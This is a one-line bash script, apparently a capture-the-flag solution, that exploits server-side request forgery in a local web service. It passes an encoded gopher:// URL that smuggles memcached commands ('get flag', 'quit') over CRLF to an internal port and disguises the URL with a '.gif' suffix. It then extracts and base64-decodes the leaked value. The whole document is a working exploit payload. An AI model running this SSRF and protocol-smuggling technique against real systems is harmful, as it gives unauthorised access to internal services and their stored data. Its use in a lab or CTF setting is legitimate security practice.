#!/bin/bash

curl "localhost/?url=gopher%3A%2F%2F0%3A11211%2Fxget%2520flag%250d%250aquit%250d%250a.gif" | grep -Po '(?<=base64,).*?(?=")' | base64 -d
